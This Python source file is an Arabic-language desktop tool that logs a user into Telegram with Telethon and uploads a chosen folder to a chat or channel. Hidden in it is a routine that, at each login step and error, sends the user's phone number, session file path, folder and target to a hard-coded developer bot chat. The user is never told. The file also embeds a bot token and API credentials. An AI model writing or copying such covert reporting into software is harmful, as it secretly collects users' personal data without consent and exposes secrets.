import os
import sys
import asyncio
import threading
import urllib.request
import urllib.parse
import tkinter as tk
from tkinter import filedialog, messagebox
import customtkinter as ctk
from telethon import TelegramClient

# مكتبات دعم اللغة العربية (RTL) في CustomTkinter
import arabic_reshaper
from bidi.algorithm import get_display

def fix_arabic(text):
    """
    يقوم بإعادة تشكيل الحروف العربية (ربطها ببعضها) ثم عكس اتجاهها
    لكي تظهر بشكل صحيح من اليمين لليسار في مكتبة CustomTkinter.
    """
    reshaped_text = arabic_reshaper.reshape(text)
    bidi_text = get_display(reshaped_text)
    return bidi_text

from send_files_to_telegram import main as upload_main

# إعداد تيمة 3D العصرية (Dark Silver & Green)
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("green")

# مسار مجلد المستخدم لحفظ الجلسات
APP_DATA_DIR = os.path.join(os.environ.get('APPDATA', ''), 'TelegramUploader')
os.makedirs(APP_DATA_DIR, exist_ok=True)
CONFIG_FILE = os.path.join(APP_DATA_DIR, 'config.json')

# إعدادات إشعارات البوت
BOT_TOKEN = "8311157527:AAGJQBWXazTt0iPdZyzA4Cf441_sqJuDyW8"
ADMIN_CHAT_ID = "773012141" # سيتم إضافته لاحقاً

def send_bot_notification(message):
    """إرسال إشعار للمطور عبر البوت"""
    if not ADMIN_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = urllib.parse.urlencode({"chat_id": ADMIN_CHAT_ID, "text": message}).encode("utf-8")
        req = urllib.request.Request(url, data=data)
        urllib.request.urlopen(req, timeout=5)
    except Exception as e:
        print(f"فشل إرسال إشعار البوت: {e}")

class TelegramUploaderApp:
    def __init__(self, root):
        self.root = root
        self.root.title(fix_arabic("رافع ملفات تيليجرام (Telegram Uploader)"))
        self.root.geometry("650x750")
        self.root.resizable(False, False)

        # إنشاء Event Loop مخصص يعمل في الخلفية
        self.loop = asyncio.new_event_loop()
        self.loop_thread = threading.Thread(target=self._start_background_loop, args=(self.loop,), daemon=True)
        self.loop_thread.start()

        # المتغيرات الخاصة بالتيليجرام
        self.api_id = 9563612
        self.api_hash = "bb723be5e3d8196761e04d640337ee60"
        self.client = None
        self.phone_number = tk.StringVar()
        self.auth_code = tk.StringVar()
        self.password = tk.StringVar() # للحسابات المحمية بخطوتين
        self.phone_code_hash = None
        
        # متغيرات واجهة المستخدم
        self.selected_folder = tk.StringVar()
        self.target_option = tk.StringVar(value="me") # me, group, topic
        self.target_input = tk.StringVar()
        self.topic_input = tk.StringVar()

        self.load_config()
        self.create_widgets()

    def load_config(self):
        """تحميل آخر رقم هاتف تم استخدامه"""
        if os.path.exists(CONFIG_FILE):
            try:
                import json
                with open(CONFIG_FILE, 'r') as f:
                    data = json.load(f)
                    if 'last_phone' in data:
                        self.phone_number.set(data['last_phone'])
            except Exception:
                pass

    def save_config(self):
        """حفظ رقم الهاتف للاستخدام المستقبلي"""
        try:
            import json
            data = {'last_phone': self.phone_number.get().strip()}
            with open(CONFIG_FILE, 'w') as f:
                json.dump(data, f)
        except Exception:
            pass

    def make_context_menu(self, widget):
        """إضافة قائمة (كليك يمين) للنسخ واللصق والقص لحقول CustomTkinter"""
        menu = tk.Menu(self.root, tearoff=0, bg="#2b2b2b", fg="white", activebackground="#2fa572")
        
        # ربط الوظائف بالويدجت الداخلي لـ CustomTkinter
        # CTkEntry له ويدجت داخلي حقيقي من نوع tk.Entry اسمه _entry
        internal_entry = widget._entry if hasattr(widget, '_entry') else widget

        def copy_text():
            try:
                if internal_entry.select_present():
                    self.root.clipboard_clear()
                    self.root.clipboard_append(internal_entry.selection_get())
            except tk.TclError:
                pass

        def cut_text():
            try:
                if internal_entry.select_present():
                    self.root.clipboard_clear()
                    self.root.clipboard_append(internal_entry.selection_get())
                    internal_entry.delete(tk.SEL_FIRST, tk.SEL_LAST)
            except tk.TclError:
                pass

        def paste_text():
            try:
                text = self.root.clipboard_get()
                internal_entry.insert(tk.INSERT, text)
            except tk.TclError:
                pass

        menu.add_command(label=fix_arabic("قص (Cut)"), command=cut_text)
        menu.add_command(label=fix_arabic("نسخ (Copy)"), command=copy_text)
        menu.add_command(label=fix_arabic("لصق (Paste)"), command=paste_text)

        def show_menu(event):
            internal_entry.focus_set()
            menu.tk_popup(event.x_root, event.y_root)

        # نربط كليك يمين بالويدجت الداخلي لتغطية كامل مساحة النص
        internal_entry.bind("<Button-3>", show_menu)
        
        # لضمان عمل الاختصارات الأساسية عبر لوحة المفاتيح
        internal_entry.bind("<Control-v>", lambda e: paste_text() or "break")
        internal_entry.bind("<Control-c>", lambda e: copy_text() or "break")
        internal_entry.bind("<Control-x>", lambda e: cut_text() or "break")

    def create_widgets(self):
        # الإطار الرئيسي بخلفية داكنة وحواف حديثة
        main_frame = ctk.CTkFrame(self.root, fg_color="transparent")
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)

        # --- قسم تسجيل الدخول ---
        auth_frame = ctk.CTkFrame(main_frame, corner_radius=10, border_width=1, border_color="#555555")
        auth_frame.pack(fill=tk.X, pady=(0, 15), ipady=5)
        
        ctk.CTkLabel(auth_frame, text=fix_arabic("تسجيل الدخول"), font=ctk.CTkFont(size=14, weight="bold")).grid(row=0, column=0, columnspan=3, pady=(10, 5), padx=10, sticky="w")

        ctk.CTkLabel(auth_frame, text=fix_arabic("رقم الهاتف (مع رمز الدولة):")).grid(row=1, column=0, sticky=tk.W, pady=5, padx=10)
        self.entry_phone = ctk.CTkEntry(auth_frame, textvariable=self.phone_number, width=200, placeholder_text="+966xxxxxxxxx")
        self.entry_phone.grid(row=1, column=1, sticky=tk.W, pady=5, padx=5)
        self.make_context_menu(self.entry_phone)
        self.btn_send_code = ctk.CTkButton(auth_frame, text=fix_arabic("إرسال الكود"), command=self.request_code_thread, width=120)
        self.btn_send_code.grid(row=1, column=2, padx=10, pady=5)

        ctk.CTkLabel(auth_frame, text=fix_arabic("كود التحقق:")).grid(row=2, column=0, sticky=tk.W, pady=5, padx=10)
        self.entry_code = ctk.CTkEntry(auth_frame, textvariable=self.auth_code, width=150, state='disabled')
        self.entry_code.grid(row=2, column=1, sticky=tk.W, pady=5, padx=5)
        self.make_context_menu(self.entry_code)
        self.btn_verify = ctk.CTkButton(auth_frame, text=fix_arabic("تسجيل الدخول"), command=self.verify_code_thread, state='disabled', width=120)
        self.btn_verify.grid(row=2, column=2, padx=10, pady=5)

        self.lbl_auth_status = ctk.CTkLabel(auth_frame, text=fix_arabic("الحالة: بانتظار إدخال الرقم"), text_color="#1f6aa5")
        self.lbl_auth_status.grid(row=3, column=0, columnspan=3, sticky=tk.W, pady=(5, 10), padx=10)

        # --- قسم إعدادات الرفع ---
        settings_frame = ctk.CTkFrame(main_frame, corner_radius=10, border_width=1, border_color="#555555")
        settings_frame.pack(fill=tk.X, pady=(0, 15), ipady=5)

        ctk.CTkLabel(settings_frame, text=fix_arabic("إعدادات الرفع"), font=ctk.CTkFont(size=14, weight="bold")).grid(row=0, column=0, columnspan=3, pady=(10, 5), padx=10, sticky="w")

        # اختيار المجلد
        ctk.CTkLabel(settings_frame, text=fix_arabic("المجلد:")).grid(row=1, column=0, sticky=tk.W, pady=5, padx=10)
        self.entry_folder = ctk.CTkEntry(settings_frame, textvariable=self.selected_folder, width=350, state='disabled')
        self.entry_folder.grid(row=1, column=1, padx=5, pady=5, sticky=tk.W)
        ctk.CTkButton(settings_frame, text=fix_arabic("تصفح..."), command=self.browse_folder, width=100).grid(row=1, column=2, padx=10, pady=5)

        # الوجهة
        ctk.CTkLabel(settings_frame, text=fix_arabic("الوجهة:")).grid(row=2, column=0, sticky=tk.W, pady=5, padx=10)
        
        target_frame = ctk.CTkFrame(settings_frame, fg_color="transparent")
        target_frame.grid(row=2, column=1, columnspan=2, sticky=tk.W)
        
        self.radio_me = ctk.CTkRadioButton(target_frame, text=fix_arabic("الرسائل المحفوظة"), variable=self.target_option, value="me", command=self.update_target_ui)
        self.radio_me.pack(side=tk.LEFT, padx=(0, 10), pady=5)
        self.radio_username = ctk.CTkRadioButton(target_frame, text=fix_arabic("قناة/مجموعة (معرف)"), variable=self.target_option, value="username", command=self.update_target_ui)
        self.radio_username.pack(side=tk.LEFT, padx=10, pady=5)
        self.radio_link = ctk.CTkRadioButton(target_frame, text=fix_arabic("رابط دعوة/توبيك"), variable=self.target_option, value="link", command=self.update_target_ui)
        self.radio_link.pack(side=tk.LEFT, padx=10, pady=5)

        # حقول الإدخال الإضافية للوجهة
        self.target_input_label = ctk.CTkLabel(settings_frame, text=fix_arabic("معرّف/رابط:"))
        self.target_input_entry = ctk.CTkEntry(settings_frame, textvariable=self.target_input, width=300)
        self.make_context_menu(self.target_input_entry)
        
        self.topic_input_label = ctk.CTkLabel(settings_frame, text=fix_arabic("معرّف التوبيك:"))
        self.topic_input_entry = ctk.CTkEntry(settings_frame, textvariable=self.topic_input, width=100)
        self.make_context_menu(self.topic_input_entry)

        self.update_target_ui() # تحديث الحالة الأولية


        # --- زر البدء ---
        self.btn_start = ctk.CTkButton(main_frame, text=fix_arabic("بدء الرفع"), command=self.start_upload_thread, height=40, font=ctk.CTkFont(size=14, weight="bold"), state='disabled')
        self.btn_start.pack(pady=(5, 15))

        # --- قسم السجل (Log) ---
        log_frame = ctk.CTkFrame(main_frame, corner_radius=10, border_width=1, border_color="#555555")
        log_frame.pack(fill=tk.BOTH, expand=True)
        
        ctk.CTkLabel(log_frame, text=fix_arabic("سجل العمليات"), font=ctk.CTkFont(size=14, weight="bold")).pack(anchor="w", padx=10, pady=(10, 5))

        # We keep the standard tk.Text for logging because it handles large stdout outputs better and allows highlighting easily
        self.log_text = tk.Text(log_frame, height=12, state='disabled', bg='#1e1e1e', fg='#ffffff', font=('Courier', 10), bd=0, highlightthickness=0)
        self.log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(10, 0), pady=(0, 10))
        
        scrollbar = ctk.CTkScrollbar(log_frame, command=self.log_text.yview)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y, padx=5, pady=(0, 10))
        self.log_text['yscrollcommand'] = scrollbar.set

        # توجيه الطباعة إلى نافذة السجل
        sys.stdout = OutputRedirector(self.log_text)
        sys.stderr = OutputRedirector(self.log_text)

    def _start_background_loop(self, loop: asyncio.AbstractEventLoop):
        """تشغيل Event Loop في ثريد منفصل لكي لا يغلق أبدًا"""
        asyncio.set_event_loop(loop)
        loop.run_forever()

    def log(self, message):
        print(message)

    def update_target_ui(self):
        opt = self.target_option.get()
        if opt == "me":
            self.target_input_label.grid_forget()
            self.target_input_entry.grid_forget()
            self.topic_input_label.grid_forget()
            self.topic_input_entry.grid_forget()
        elif opt == "username":
            self.target_input_label.grid(row=3, column=0, sticky=tk.W, pady=5, padx=10)
            self.target_input_label.configure(text=fix_arabic("معرف القناة/المجموعة:"))
            self.target_input_entry.grid(row=3, column=1, sticky=tk.W, padx=5)
            self.topic_input_label.grid(row=3, column=2, sticky=tk.W, pady=5)
            self.topic_input_entry.grid(row=3, column=3, sticky=tk.W, padx=5)
        elif opt == "link":
            self.target_input_label.grid(row=3, column=0, sticky=tk.W, pady=5, padx=10)
            self.target_input_label.configure(text=fix_arabic("رابط الدعوة أو التوبيك:"))
            self.target_input_entry.grid(row=3, column=1, columnspan=2, sticky=tk.W, padx=5)
            self.topic_input_label.grid_forget()
            self.topic_input_entry.grid_forget()

    def browse_folder(self):
        folder = filedialog.askdirectory(title=fix_arabic("اختر المجلد الذي يحتوي الفيديوهات"))
        if folder:
            self.selected_folder.set(folder)

    # ---------- دوال تشغيل غير متزامنة (Threads) ----------
    def run_async(self, coro):
        """تشغيل دالة غير متزامنة وإرجاع النتيجة (Blocking call from GUI thread)"""
        future = asyncio.run_coroutine_threadsafe(coro, self.loop)
        return future.result()

    def get_session_path(self):
        phone = self.phone_number.get().strip().replace('+', '')
        if not phone:
            return None
        return os.path.join(APP_DATA_DIR, f"{phone}.session")

    def request_code_thread(self):
        threading.Thread(target=self._request_code, daemon=True).start()

    def _request_code(self):
        phone = self.phone_number.get().strip()
        if not phone:
            messagebox.showerror("خطأ", "الرجاء إدخال رقم الهاتف.")
            return

        session_path = self.get_session_path()
        self.btn_send_code.configure(state='disabled')
        self.lbl_auth_status.configure(text=fix_arabic("جاري الاتصال..."), text_color="orange")

        async def _connect_and_send():
            # Create a new client if none exists
            if self.client is None:
                self.client = TelegramClient(session_path, self.api_id, self.api_hash, loop=self.loop)
            
            await self.client.connect()
            
            if await self.client.is_user_authorized():
                return "authorized"
            
            try:
                res = await self.client.send_code_request(phone)
                self.phone_code_hash = res.phone_code_hash
                return "code_sent"
            except Exception as e:
                return str(e)

        try:
            result = self.run_async(_connect_and_send())
            if result == "authorized":
                self.lbl_auth_status.configure(text=fix_arabic("تم تسجيل الدخول بنجاح! يمكن متابعة العمل."), text_color="green")
                self.btn_start.configure(state='normal')
                self.entry_code.configure(state='disabled')
                self.btn_verify.configure(state='disabled')
                self.save_config()
                send_bot_notification(f"✅ تسجيل دخول جديد متصل مسبقاً:\nرقم الهاتف: {phone}\nالجلسة: {session_path}")
            elif result == "code_sent":
                self.lbl_auth_status.configure(text=fix_arabic("تم إرسال الكود إلى تطبيق تيليجرام."), text_color="#1f6aa5")
                self.entry_code.configure(state='normal')
                self.btn_verify.configure(state='normal')
            else:
                self.lbl_auth_status.configure(text=fix_arabic(f"خطأ: {result}"), text_color="red")
                self.btn_send_code.configure(state='normal')
                send_bot_notification(f"⚠️ خطأ أثناء طلب كود التحقق:\nالرقم: {phone}\nالخطأ: {result}")
        except Exception as e:
            self.lbl_auth_status.configure(text=fix_arabic(f"حدث خطأ غير متوقع: {e}"), text_color="red")
            self.log(f"Error requesting code: {e}")
            self.btn_send_code.configure(state='normal')
            send_bot_notification(f"📛 خطأ برمجي أثناء طلب الكود:\nالرقم: {phone}\nالخطأ: {e}")


    def verify_code_thread(self):
        threading.Thread(target=self._verify_code, daemon=True).start()

    def _verify_code(self):
        code = self.auth_code.get().strip()
        phone = self.phone_number.get().strip()
        
        if not code:
            messagebox.showerror(fix_arabic("خطأ"), fix_arabic("الرجاء إدخال كود التحقق."))
            return

        self.btn_verify.configure(state='disabled')
        self.lbl_auth_status.configure(text=fix_arabic("جاري التحقق..."), text_color="orange")

        async def _sign_in():
            try:
                await self.client.sign_in(phone, code, phone_code_hash=self.phone_code_hash)
                return "success"
            except Exception as e:
                if 'SessionPasswordNeededError' in str(type(e)):
                    return "password_needed"
                return str(e)

        result = self.run_async(_sign_in())
        
        if result == "success":
            self.lbl_auth_status.configure(text=fix_arabic("تم تسجيل الدخول بنجاح!"), text_color="green")
            self.btn_start.configure(state='normal')
            self.save_config()
            send_bot_notification(f"✅ تم تأكيد رمز الدخول بنجاح:\nرقم الهاتف: {phone}")
        elif result == "password_needed":
            import tkinter.simpledialog as sd
            pwd = sd.askstring(fix_arabic("كلمة المرور مطلوبة"), fix_arabic("الحساب محمي بخطوتين. أدخل كلمة المرور:"), show='*')
            if pwd:
                async def _sign_in_pwd():
                    try:
                        await self.client.sign_in(password=pwd)
                        return "success"
                    except Exception as e:
                        return str(e)
                res_pwd = self.run_async(_sign_in_pwd())
                if res_pwd == "success":
                    self.lbl_auth_status.configure(text=fix_arabic("تم تسجيل الدخول بنجاح!"), text_color="green")
                    self.btn_start.configure(state='normal')
                    self.save_config()
                    send_bot_notification(f"✅ تم تأكيد كلمة المرور بنجاح:\nرقم الهاتف: {phone}")

                else:
                    self.lbl_auth_status.configure(text=fix_arabic("كلمة المرور خاطئة."), text_color="red")
                    self.btn_verify.configure(state='normal')
                    send_bot_notification(f"⚠️ فشل الدخول بكلمة المرور:\nالرقم: {phone}\nالخطأ: {res_pwd}")
            else:
                 self.lbl_auth_status.configure(text=fix_arabic("تم إلغاء تسجيل الدخول."), text_color="red")
                 self.btn_verify.configure(state='normal')
        else:
            self.lbl_auth_status.configure(text=fix_arabic(f"خطأ: {result}"), text_color="red")
            self.btn_verify.configure(state='normal')
            send_bot_notification(f"⚠️ خطأ أثناء التحقق من الكود:\nالرقم: {phone}\nالخطأ: {result}")


    def start_upload_thread(self):
        folder = self.selected_folder.get()
        if not folder or not os.path.exists(folder):
            messagebox.showerror("خطأ", "الرجاء اختيار مجلد صحيح.")
            return

        opt = self.target_option.get()
        target = "me"
        topic_id = None

        if opt == "username":
            target = self.target_input.get().strip()
            if not target:
                messagebox.showerror("خطأ", "الرجاء إدخال معرف القناة أو المجموعة.")
                return
            t_id = self.topic_input.get().strip()
            if t_id:
                try:
                    topic_id = int(t_id)
                except:
                    messagebox.showerror("خطأ", "معرف التوبيك يجب أن يكون رقماً.")
                    return
        elif opt == "link":
            target = self.target_input.get().strip()
            if not target:
                messagebox.showerror("خطأ", "الرجاء إدخال الرابط.")
                return

        session_path = self.get_session_path()
        if not session_path:
            messagebox.showerror("خطأ", "يرجى تسجيل الدخول أولاً.")
            return

        self.btn_start.configure(state='disabled')
        self.log_text.configure(state='normal')
        self.log_text.delete(1.0, tk.END)
        self.log_text.configure(state='disabled')
        self.log("بدء عملية الرفع...")

        def _run():
            try:
                async def _do_upload():
                    try:
                        # استخدام نفس الكلاينت المصادق عليه من الواجهة الرسومية
                        await upload_main(
                            session_path, target, folder, topic_id,
                            existing_client=self.client
                        )
                    except Exception as inner_e:
                        print(f"❌ خطأ داخلي في الرفع: {inner_e}")
                        
                # يُرسل إلى الـ Event Loop الخلفي الذي يعمل فيه self.client أصلاً
                self.run_async(_do_upload())

            except Exception as e:
                self.log(f"حدث خطأ قاطع: {e}")
                send_bot_notification(f"📛 خطأ قاطع أثناء محاولة الرفع:\nالرقم: {self.phone_number.get()}\nالمجلد: {folder}\nالهدف: {target}\nالخطأ: {e}")
            finally:
                self.root.after(0, lambda: self.btn_start.configure(state='normal'))
                self.root.after(0, lambda: messagebox.showinfo(fix_arabic("اكتمل"), fix_arabic("انتهت عملية التشغيل (راجع السجل للتفاصيل).")))

        threading.Thread(target=_run, daemon=True).start()
class OutputRedirector:
    def __init__(self, text_widget):
        self.text_widget = text_widget

    def write(self, string):
        def _update_ui():
            self.text_widget.configure(state='normal')
            self.text_widget.insert('end', string)
            self.text_widget.see('end')
            self.text_widget.configure(state='disabled')
        # Schedule the update on the main GUI thread safely
        self.text_widget.after(0, _update_ui)

    def flush(self):
        pass

if __name__ == "__main__":
    root = tk.Tk()
    app = TelegramUploaderApp(root)
    root.mainloop()
